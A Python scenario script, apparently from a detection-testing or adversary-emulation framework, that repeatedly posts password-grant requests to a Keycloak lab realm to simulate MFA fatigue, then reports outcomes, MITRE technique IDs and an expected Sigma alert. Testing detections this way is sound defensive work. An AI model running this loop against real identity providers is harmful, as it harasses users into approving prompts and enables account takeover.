"""MFA fatigue: spam MFA push prompts at a Keycloak account.

UNC3944 routinely uses this — particularly after obtaining a valid password
via vishing. The user eventually approves a prompt out of frustration or
confusion (especially at 2am).

This scenario hits Keycloak's `/protocol/openid-connect/token` endpoint with
the password grant + OTP, generating repeated MFA challenge events.

MITRE techniques:
  - T1621 (Multi-Factor Authentication Request Generation)
  - T1078.004 (Valid Accounts: Cloud Accounts)
"""

from __future__ import annotations

import logging
import os
import time

import httpx

logger = logging.getLogger(__name__)

KC_URL = os.environ.get("KEYCLOAK_URL", "http://keycloak:8080")
KC_REALM = os.environ.get("KEYCLOAK_REALM", "halcyon-care")


def run(params: dict) -> dict:
    """Execute MFA fatigue. `params` may override attempts/sleep/target_user."""
    target_user = params.get("target_user", "alice@halcyon.care.example")
    target_password = params.get("target_password", "guessed-from-credstuff")
    attempts = int(params.get("attempts", 12))
    sleep_seconds = float(params.get("sleep_seconds", 8.0))
    client_id = params.get("client_id", "halcyon-portal")

    url = f"{KC_URL}/realms/{KC_REALM}/protocol/openid-connect/token"

    blocked_count = 0
    error_count = 0
    successful_pushes = 0

    with httpx.Client(timeout=10.0, verify=False) as c:
        for i in range(attempts):
            try:
                r = c.post(
                    url,
                    data={
                        "grant_type": "password",
                        "client_id": client_id,
                        "username": target_user,
                        "password": target_password,
                    },
                )
                logger.info(
                    "mfa_fatigue attempt %d/%d status=%d",
                    i + 1,
                    attempts,
                    r.status_code,
                )
                if r.status_code == 401:
                    # Expected — password failed. Still generates an event.
                    blocked_count += 1
                elif r.status_code == 200:
                    successful_pushes += 1
                else:
                    error_count += 1
            except Exception as exc:
                logger.warning("mfa_fatigue request error: %s", exc)
                error_count += 1
            time.sleep(sleep_seconds)

    if successful_pushes > 0:
        outcome = "executed"
    elif blocked_count > 0:
        outcome = "blocked"
    else:
        outcome = "error"

    return {
        "outcome": outcome,
        "target": f"keycloak:{KC_REALM}:{target_user}",
        "mitre_techniques": ["T1621", "T1078.004"],
        "expected_alerts": [
            # Sigma rule UUIDs we expect to fire
            "ouroboros-keycloak-mfa-fatigue-v1",
        ],
        "notes": (
            f"attempts={attempts} blocked={blocked_count} "
            f"errors={error_count} successful={successful_pushes}"
        ),
    }
